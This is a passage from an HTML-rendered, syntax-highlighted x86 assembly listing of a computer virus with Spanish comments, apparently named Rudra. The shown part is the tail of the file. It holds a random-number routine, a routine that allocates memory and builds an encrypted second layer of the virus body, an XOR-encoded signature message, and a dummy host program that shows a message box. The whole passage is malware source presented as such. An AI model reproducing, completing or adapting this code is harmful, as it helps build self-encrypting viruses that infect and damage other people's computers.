  </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc1">; EBX -&gt; Limite superior.</span><span class="sc0">
  </span><span class="sc1">; Retorna en EAX el numero aleatorio.</span><span class="sc0">

  </span><span class="sc5">Random</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Aleat</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">IMUL</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">036FB5419h</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00004A6Dh</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Aleat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
  </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc1">; Proceso para copiar la segunda capa de encriptacion.</span><span class="sc0">

  </span><span class="sc5">@Segunda_Capa</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSHAD</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MEM_TOP_DOWN</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Virus</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">VirtualAlloc</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Memoria</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@NosJodimos</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Empieza_Virus</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Empieza_Layer2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Empieza_Virus</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Llave_II</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Layer2</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
  </span><span class="sc5">@@JO</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">MOVSW</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">2h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
  </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">@@JO</span><span class="sc0">

  </span><span class="sc5">@NosJodimos</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">POPAD</span><span class="sc0">

  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc5">Aleat</span><span class="sc0">                 </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

  </span><span class="sc5">RUMEN</span><span class="sc0">                 </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

  </span><span class="sc6">NOP</span><span class="sc0">

  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"R"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"c"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"u"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"r"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"d"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"a"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"l"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"4"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"d"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"F"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"b"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"r"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"r"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"o"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"d"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"1"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"9"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"9"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"2"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"."</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"."</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                    </span><span class="sc3">"."</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0">                            </span><span class="sc2">43h</span><span class="sc0">


  </span><span class="sc5">Termina_Virus</span><span class="sc0">         </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">NEAR</span><span class="sc0">

</span><span class="sc1">; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

  </span><span class="sc5">Host_Falso</span><span class="sc0">            </span><span class="sc9">PROC</span><span class="sc0">

    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Ventana</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Titulo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc5">Host_Falso</span><span class="sc0">            </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Rudra</span><span class="sc0">
</span></div></body>
</html>
